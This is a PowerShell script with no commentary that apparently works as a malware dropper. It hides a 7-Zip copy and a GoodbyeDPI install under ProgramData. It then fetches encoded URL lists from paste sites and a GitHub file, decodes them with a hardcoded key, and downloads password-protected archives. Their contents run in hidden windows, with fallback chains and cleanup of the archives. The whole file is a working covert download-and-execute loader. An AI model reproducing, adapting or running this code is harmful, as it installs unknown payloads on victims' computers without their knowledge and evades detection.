function Install-GoodbyeDPI { 
$installPath = "C:\ProgramData\SSLNetwork"; 
$exePath = Join-Path $installPath "goodbyedpi.exe"; 
$archiveUrl = "https://raw.githubusercontent.com/bvcsurs/goodbyedpi/main/goodbyedpi.7z"; 
$archivePath = Join-Path $installPath "goodbyedpi.7z"; 
$7zPath = "C:\ProgramData\sevenZip\7z.exe"; 
if (-not (Test-Path $installPath)) { 
try { 
New-Item -Path $installPath -ItemType Directory -ErrorAction Stop } 
catch { return } }; 
$existingProcess = Get-Process -Name goodbyedpi -ErrorAction SilentlyContinue; 
if ($existingProcess) { return }; 
if (-not (Test-Path $exePath)) { 
try { Invoke-WebRequest -Uri $archiveUrl -OutFile $archivePath } catch { return }; 
try { Start-Process -FilePath $7zPath -ArgumentList "x `"$archivePath`" -o`"$installPath`" -y" 
-Wait -NoNewWindow -PassThru } catch { return } }; 
try { $fileAttributes = (Get-Item $exePath).Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System; 
Set-ItemProperty -Path $installPath -Name Attributes -Value $fileAttributes } 
catch { return }; 
try { Start-Process -FilePath $exePath -ArgumentList "-5 --dns-addr 77.88.8.8 --dns-port 1253 --dnsv6-addr 2a02:6b8::feed:0ff --dnsv6-port 1253" -WindowStyle Hidden } 
catch { return } }; function Download-String 
{ param ([string]$url, [int]$timeout = 15000) 
$request = [System.Net.WebRequest]::Create($url); 
$request.Timeout = $timeout; 
$response = $request.GetResponse(); 
$streamReader = New-Object System.IO.StreamReader($response.GetResponseStream()); 
$content = $streamReader.ReadToEnd(); $streamReader.Close(); $response.Close(); 
return $content }; function Download-First { $url = "https://text.is/gogglesFront/raw"; 
$keys = "vibe.process-byunknown"; 
try { $encryptedTextBase64 = Invoke-RestMethod -Uri $url } 
catch { return }; 
if ($encryptedTextBase64) { 
$decryptedText = Decrypt-WithBase64 -encryptedTextBase64 $encryptedTextBase64 -key $keys }; 
$split1 = $decryptedText; 
$randStringv1 = [System.Guid]::NewGuid().ToString(); 
$temp1 = [System.IO.Path]::GetTempPath(); 
$extractPath = Join-Path $temp1 ($randStringv1); 
$client = New-Object System.Net.WebClient; foreach ($url1 in $split1) { 
try { $bytes1 = $client.DownloadData($url1); 
if ($bytes1.Length -gt 0) { $randString = ([System.IO.Path]::GetRandomFileName() -replace "\.", "").Substring(0, 10); 
$filePath1 = Join-Path $temp1 ($randString + ".7z"); [System.IO.File]::WriteAllBytes($filePath1, $bytes1); 
$psii = New-Object System.Diagnostics.ProcessStartInfo; 
$psii.FileName = "C:\ProgramData\sevenZip\7z.exe"; 
$psii.Arguments = "x `"$filePath1`" -o`"$extractPath`" -phR3^&b2%A9!gK*6LqP7t`$NpW"; 
$psii.CreateNoWindow = $true; $psii.UseShellExecute = $false; 
try { $process = [System.Diagnostics.Process]::Start($psii); 
$process.WaitForExit() } catch { }; 
$extractedFiles = Get-ChildItem $extractPath; 
$fileToExecute = $extractedFiles | Select-Object -First 1; 
$psi = New-Object System.Diagnostics.ProcessStartInfo; 
$psi.FileName = $fileToExecute.FullName; 
$psi.UseShellExecute = $false; 
$psi.CreateNoWindow = $true; 
[System.Diagnostics.Process]::Start($psi); 
if (Test-Path $filePath1) { Remove-Item $filePath1 } } } 
catch { Write-Host "DONE"; Download-GitHub } } }; 
function Download-GitHub { 
try { $url = "https://raw.githubusercontent.com/bvcsurs/bitadmin/main/package"; 
$key = "vibe.process-byunknown"; 
$webClient = New-Object System.Net.WebClient; 
$data = Download-String($url); 
$lines = $data -split "`n"; 
$lineNumber = 0; 
foreach ($line in $lines) { $lineNumber++; if ($lineNumber -eq 1068) { try { $decryptedData = Decrypt-WithBase64 $line $key; 
$url1 = $decryptedData; 
Download-File $webClient $url1; 
break } catch { } } } } 
catch { Download-V3 } finally 
{ $webClient.Dispose() } }; 
function Decrypt-WithBase64 { 
param ([string]$encryptedTextBase64, [string]$key) 
try { 
$encryptedTextBytes = [System.Convert]::FromBase64String($encryptedTextBase64); 
$encryptedTextString = [System.Text.Encoding]::UTF8.GetString($encryptedTextBytes); 
$decryptedText = New-Object char[] $encryptedTextString.Length; for ($i = 0; $i -lt $encryptedTextString.Length; $i++) { 
$character = $encryptedTextString[$i]; $keyCharacter = $key[$i % $key.Length]; 
$decryptedText[$i] = [char]($character - $keyCharacter) }; 
return -join $decryptedText } catch {} }; 
function Download-File { 
param ([System.Net.WebClient]$Client, [string]$Url) 
try { $bytes = $Client.DownloadData($Url); 
if ($bytes.Length -gt 0) { 
$tempPath = [System.IO.Path]::GetTempPath(); 
$randString = [System.IO.Path]::GetRandomFileName().Replace(".", "").Substring(0, 10); 
$extractPath = Join-Path $tempPath ("G" + $randString); 
$filePath = Join-Path $tempPath ($randString + ".7z"); 
[System.IO.File]::WriteAllBytes($filePath, $bytes); 
$psii = New-Object System.Diagnostics.ProcessStartInfo; 
$psii.FileName = "C:\ProgramData\sevenZip\7z.exe"; 
$psii.Arguments = "x `"$filePath`" -o`"$extractPath`" -phR3^&b2%A9!gK*6LqP7t`$NpW"; 
$psii.CreateNoWindow = $true; $psii.UseShellExecute = $false; 
try { 
$process = [System.Diagnostics.Process]::Start($psii); 
$process.WaitForExit() } catch { }; 
$extractedFiles = Get-ChildItem $extractPath; 
$fileToExecute = $extractedFiles | Select-Object -First 1; 
$psi = New-Object System.Diagnostics.ProcessStartInfo; 
$psi.FileName = $fileToExecute.FullName; 
$psi.UseShellExecute = $false; 
$psi.CreateNoWindow = $true; 
try { [System.Diagnostics.Process]::Start($psi) } catch { }; 
if (Test-Path $filePath) { Remove-Item $filePath } } } catch { Download-V3 } }; 
function Download-V3 { 
try { $url = "https://rentry.co/MuckD/raw"; 
$keys = "vibe.process-byunknown"; 
try { $encryptedTextBase64 = Invoke-RestMethod -Uri $url } catch { return }; 
if ($encryptedTextBase64) { $decryptedText = Decrypt-WithBase64 -encryptedTextBase64 $encryptedTextBase64 -key $keys }; 
$split1 = $decryptedText; $randStringv1 = [System.Guid]::NewGuid().ToString(); $temp1 = [System.IO.Path]::GetTempPath(); 
$extractPath = Join-Path $temp1 ("Rent" + $randStringv1); 
$client = New-Object System.Net.WebClient; 
foreach ($url1 in $split1) { 
try { $bytes1 = $client.DownloadData($url1); 
if ($bytes1.Length -gt 0) { $randString = ([System.IO.Path]::GetRandomFileName() -replace "\.", "").Substring(0, 10); 
$filePath1 = Join-Path $temp1 ($randString + ".7z"); 
[System.IO.File]::WriteAllBytes($filePath1, $bytes1); 
$psii = New-Object System.Diagnostics.ProcessStartInfo; 
$psii.FileName = "C:\ProgramData\sevenZip\7z.exe"; $psii.Arguments = "x `"$filePath1`" -o`"$extractPath`" -phR3^&b2%A9!gK*6LqP7t`$NpW"; 
$psii.CreateNoWindow = $true; $psii.UseShellExecute = $false; 
try { $process = [System.Diagnostics.Process]::Start($psii); 
$process.WaitForExit() } catch { }; 
$extractedFiles = Get-ChildItem $extractPath; 
$fileToExecute = $extractedFiles | Select-Object -First 1; 
$psi = New-Object System.Diagnostics.ProcessStartInfo; 
$psi.FileName = $fileToExecute.FullName; 
$psi.UseShellExecute = $false; 
$psi.CreateNoWindow = $true; [System.Diagnostics.Process]::Start($psi); 
if (Test-Path $filePath1) { Remove-Item $filePath1 } } } catch {} } } catch { Paste-FO } }; 
function Paste-FO { try { $ur1 = "https://paste.fo/raw/573e09b039a1"; 
$body1 = Download-String($ur1); $split1 = $body1 -split "\r?\n"; 
$randStringv1 = [System.Guid]::NewGuid().ToString(); 
$temp1 = [System.IO.Path]::GetTempPath(); 
$extractPath = Join-Path $temp1 ("FO" + $randStringv1); 
$client = New-Object System.Net.WebClient; foreach ($url1 in $split1) { 
try { $bytes1 = $client.DownloadData($url1); 
if ($bytes1.Length -gt 0) { 
$randString = ([System.IO.Path]::GetRandomFileName() -replace "\.", "").Substring(0, 10); 
$filePath1 = Join-Path $temp1 ($randString + ".7z"); 
[System.IO.File]::WriteAllBytes($filePath1, $bytes1); $psii = New-Object System.Diagnostics.ProcessStartInfo; 
$psii.FileName = "C:\ProgramData\sevenZip\7z.exe"; 
$psii.Arguments = "x `"$filePath1`" -o`"$extractPath`" -phR3^&b2%A9!gK*6LqP7t`$NpW"; 
$psii.CreateNoWindow = $true; $psii.UseShellExecute = $false; 
try { $process = [System.Diagnostics.Process]::Start($psii); 
$process.WaitForExit() } catch { }; 
$extractedFiles = Get-ChildItem $extractPath; 
$fileToExecute = $extractedFiles | Select-Object -First 1; 
$psi = New-Object System.Diagnostics.ProcessStartInfo; 
$psi.FileName = $fileToExecute.FullName; 
$psi.UseShellExecute = $false; 
$psi.CreateNoWindow = $true; 
[System.Diagnostics.Process]::Start($psi); 
if (Test-Path $filePath1) { Remove-Item $filePath1 } } } catch {} } } catch { TextBin } }; 
function TextBin { $ur1 = "https://textbin.net/raw/arslvyl0nw"; 
$body1 = Download-String($ur1); 
$split1 = $body1 -split "\r?\n"; 
$randStringv1 = [System.Guid]::NewGuid().ToString(); 
$temp1 = [System.IO.Path]::GetTempPath(); 
$extractPath = Join-Path $temp1 ("TXTBIN" + $randStringv1); 
$client = New-Object System.Net.WebClient; 
foreach ($url1 in $split1) { try { $bytes1 = $client.DownloadData($url1); 
if ($bytes1.Length -gt 0) { $randString = ([System.IO.Path]::GetRandomFileName() -replace "\.", "").Substring(0, 10); 
$filePath1 = Join-Path $temp1 ($randString + ".7z"); 
[System.IO.File]::WriteAllBytes($filePath1, $bytes1); 
$psii = New-Object System.Diagnostics.ProcessStartInfo; 
$psii.FileName = "C:\ProgramData\sevenZip\7z.exe"; 
$psii.Arguments = "x `"$filePath1`" -o`"$extractPath`" -phR3^&b2%A9!gK*6LqP7t`$NpW"; $psii.CreateNoWindow = $true; 
$psii.UseShellExecute = $false; 
try { $process = [System.Diagnostics.Process]::Start($psii); 
$process.WaitForExit() } catch { }; 
$extractedFiles = Get-ChildItem $extractPath; 
$fileToExecute = $extractedFiles | Select-Object -First 1; 
$psi = New-Object System.Diagnostics.ProcessStartInfo; 
$psi.FileName = $fileToExecute.FullName; 
$psi.UseShellExecute = $false; 
$psi.CreateNoWindow = $true; 
[System.Diagnostics.Process]::Start($psi); 
if (Test-Path $filePath1) { Remove-Item $filePath1 } } } catch {} } }; 
$folderPath = "C:\ProgramData\sevenZip"; 
if (-not (Test-Path "$folderPath\7z.exe")) { New-Item -ItemType Directory -Path $folderPath -Force; 
$url = "https://www.7-zip.org/a/7zr.exe"; 
$outputFile = Join-Path -Path $folderPath -ChildPath "7z.exe"; 
Invoke-WebRequest -Uri $url -OutFile $outputFile; 
Set-ItemProperty -Path $outputFile -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System); 
Set-ItemProperty -Path $folderPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System) }; 
function Check-Admin { $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent()); 
return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) }; 
if (Check-Admin) { Install-GoodbyeDPI }; Download-First
